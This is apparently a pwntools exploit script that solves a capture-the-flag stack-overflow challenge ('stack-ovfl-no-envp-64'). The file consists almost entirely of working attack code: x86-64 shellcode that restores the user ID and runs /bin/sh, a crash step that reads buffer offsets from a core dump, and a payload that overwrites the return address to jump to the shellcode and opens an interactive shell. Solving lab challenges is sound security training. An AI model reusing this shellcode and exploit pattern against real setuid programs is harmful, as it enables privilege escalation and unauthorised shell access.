from pwn import *
import os

DEBUG = False 

context.arch = 'x86-64'
context.bits = 64

shellcode = asm('''
xor    rax,rax
xor    al,0x6c
syscall
mov    rdi,rax
mov    rsi,rax
xor    rax,rax
xor    al,0x72
syscall
xor    rsi,rsi
xor    rdx,rdx
xor    rax,rax
xor    al,0x3b
movabs rbx,0x68732f6e69622f2f

xor    rdi,rdi
push   rdi
push   rbx
mov    rdi,rsp
syscall
''') 

env = {}
file = ['./stack-ovfl-no-envp-64', shellcode]

# crash the process to get a core file and find the buffer address (still boilerplate)

io = process(file, env=env, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
shellcode_address = core.stack.find(shellcode)
buffer_address = core.stack.find(cyclic(50))
max_len = cyclic(10000).find(p64(core.fault_addr))
os.unlink(core.path) 

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b main
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE


payload = b"A" * (max_len) + p64(shellcode_address)
io.send(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'$', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
